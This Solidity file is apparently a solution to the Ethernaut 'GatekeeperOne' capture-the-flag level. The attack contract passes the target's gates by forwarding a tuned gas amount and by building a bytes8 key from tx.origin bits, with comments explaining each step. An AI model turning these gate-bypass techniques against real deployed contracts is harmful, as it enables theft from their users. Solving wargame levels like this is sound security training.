// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title AttackGateKeeperOne
/// @author IbCaOs
contract AttackGateKeeperOne {
    address public gateKeeper;

    constructor(address _target) {
        gateKeeper = _target;
    }

    function attack(uint256 gas, uint256 offsetGas) external {
        bytes8 dataKey = getDataKey();
        // Solution for second gate (gas + offset)
        (bool success, ) = gateKeeper.call{gas: gas + offsetGas}(abi.encodeWithSignature("enter(bytes8)", dataKey));
        require(success, "ERROR: GAS");
    }

    function getDataKey() public view returns (bytes8) {
        // Solution for third gate
        // First, we extract the last 2 bytes of tx.origin by casting it using
        // bytes8(abi.encodePacked(uint16(uint160(tx.origin)))). We then perform a right shift
        // to position these two bytes at the beginning.
        bytes8 dataKey = bytes8(abi.encodePacked(uint16(uint160(tx.origin)))) >>
            48;

        // After shifting the last two bytes, we use bitwise operations to set the first byte to 0x10.
        return dataKey | bytes8(0x1000000000000000);
    }
}
